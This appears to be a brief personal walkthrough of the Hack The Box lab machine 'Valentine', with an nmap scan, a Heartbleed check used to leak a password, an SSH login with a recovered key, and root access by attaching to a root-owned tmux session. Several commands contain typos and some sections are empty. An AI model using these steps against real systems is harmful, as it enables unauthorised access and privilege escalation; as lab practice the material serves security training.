# Information gathering

## system network

`10.10.10.79`

## Nmap Scan Result

``` bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2022-12-30T01:43:18+00:00; -1s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
```

## Directory enumeration

_1. find dev directory_
![[Pasted image 20221230112744.png]]
_2. get hype_key file

_3. decode with hex_

## Password Crack

_the 443 port is vulnerable to hearbleed
```bash
nmap --script ssl-hearbleed -p443 10.10.10.79
```

_get password by memery infomation leak_

[Heartbleed memory disclosure](https://www.exploit-db.com/exploits/32764)

`password:`heartbleedbelievethehype

# Exploit

## Initial Foothold

```bash
ssh  -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa hype@10.10.10.79
```

### Exp

None

### Proof

![[Pasted image 20221230113154.png]]

## Lateral Movement

### Method

### Proof


## Privilege Escalation

### Method

attach to a existing sessiong which is run as root user.
```bash
# list all tmux process
ps aux | grep tmux
# output: root       1001  0.0  0.1  26416  1672 ?        Ss   17:41   0:05 /usr/bin/tmux -S /.devs/dev_sess

# attach session from /.devs/dev_sess
tmux -S /.devs/dev_sess
```

### proof

![[Pasted image 20221230142816.png]]
